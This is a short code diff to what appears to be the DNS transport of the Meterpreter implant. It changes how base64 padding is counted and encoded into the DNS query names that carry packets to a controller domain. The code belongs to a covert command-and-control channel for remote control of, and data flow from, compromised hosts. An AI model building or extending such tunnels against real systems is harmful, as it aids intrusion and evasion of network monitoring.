@@ -1,5 +1,5 @@
 /*!
- * @file server_transport_http.c
+ * @file server_transport_windns.c
  * @remark This file doesn't use precompiled headers because metsrv.h includes a bunch of
  *         of definitions that clash with those found in winhttp.h. Hooray Win32 API. I hate you.
  */
@@ -255,6 +255,7 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
 	wchar_t *base64 = NULL;
 	BOOL res;
 	wchar_t sub_c[7];
+    wchar_t padd[2];
 	DWORD rest_len;
 	DWORD parts;
 	DWORD parts_last;
@@ -293,8 +294,11 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
 	res = CryptBinaryToStringW((BYTE *)buffer, totalLength, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64, &need_to_send);
 
     vdprintf("[PACKET TRANCIEVE WINDNS] BEFOR: %S",base64);
-    
-	while (base64[need_to_send - 1] == L'=') --need_to_send;
+    DWORD padd_ = 0;
+	while (base64[need_to_send - 1] == L'=') { 
+        --need_to_send;  
+        padd_++;
+    };
 
 	DWORD i = 0;
 	while (base64[i] != L'\0')
@@ -317,7 +321,9 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
 		request = (wchar_t *)calloc(MAX_DNS_NAME_SIZE + 1, sizeof(wchar_t));
 		_itow_s(need_to_send, request, MAX_DNS_NAME_SIZE, 10);
 		_itow_s(*counter, sub_c, 6, 10);
-
+        vdprintf("[PACKET TRANCIEVE WINDNS] padding1: %d", padd_);
+        _itow_s(padd_, padd, 2, 10);
+        vdprintf("[PACKET TRANCIEVE WINDNS] padding2: %S", padd);
 		wcscat_s(request, MAX_DNS_NAME_SIZE, L".tx.");
 		wcscat_s(request, MAX_DNS_NAME_SIZE, sub_c);
 		wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
@@ -379,7 +385,8 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
                 wcsncat_s(request, MAX_DNS_NAME_SIZE, L".", 1);
 			}
 
-			wcscat_s(request, MAX_DNS_NAME_SIZE, L"t.");
+			wcscat_s(request, MAX_DNS_NAME_SIZE, padd);
+            wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
 			wcscat_s(request, MAX_DNS_NAME_SIZE, sub_c);
 			wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
 			wcscat_s(request, MAX_DNS_NAME_SIZE, domain);
